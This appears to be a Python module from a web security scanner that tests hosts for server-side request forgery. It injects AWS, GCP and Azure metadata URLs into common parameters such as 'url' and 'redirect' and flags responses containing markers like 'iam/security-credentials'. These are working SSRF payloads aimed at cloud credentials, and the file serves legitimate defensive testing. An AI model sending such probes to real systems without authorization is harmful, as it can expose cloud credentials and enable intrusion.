"""Cloud metadata exposure (SSRF) testing."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class CloudMetadataCheck(BaseCheck):
    name = "Cloud Metadata (SSRF)"
    description = "Check for SSRF-accessible cloud metadata endpoints"

    METADATA_URLS = [
        ("AWS", "http://169.254.169.254/latest/meta-data/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ]

    SSRF_PARAMS = ["url", "redirect", "next", "path", "uri", "src", "dest",
                   "target", "link", "proxy", "fetch", "load", "file"]

    CLOUD_INDICATORS = {
        "AWS": ["ami-id", "instance-id", "iam/security-credentials"],
        "GCP": ["project/project-id", "instance/zone"],
        "Azure": ["compute", "vmId"],
    }

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for cloud, meta_url in self.METADATA_URLS:
                for param in self.SSRF_PARAMS:
                    test_url = f"{base}?{param}={meta_url}"
                    rc, body, _ = run(
                        ["curl", "-sL", "--max-time", "8", test_url],
                        timeout=12,
                    )
                    if rc != 0 or not body:
                        continue
                    for indicator in self.CLOUD_INDICATORS.get(cloud, []):
                        if indicator in body:
                            self.findings.append(Finding(
                                severity="critical",
                                title=f"SSRF to {cloud} Cloud Metadata",
                                host=base,
                                detail=f"Parameter '{param}' allows access to {cloud} metadata",
                                source="cloud_metadata",
                                url=test_url,
                                evidence=body[:500],
                            ))
                            return self.findings

        return self.findings
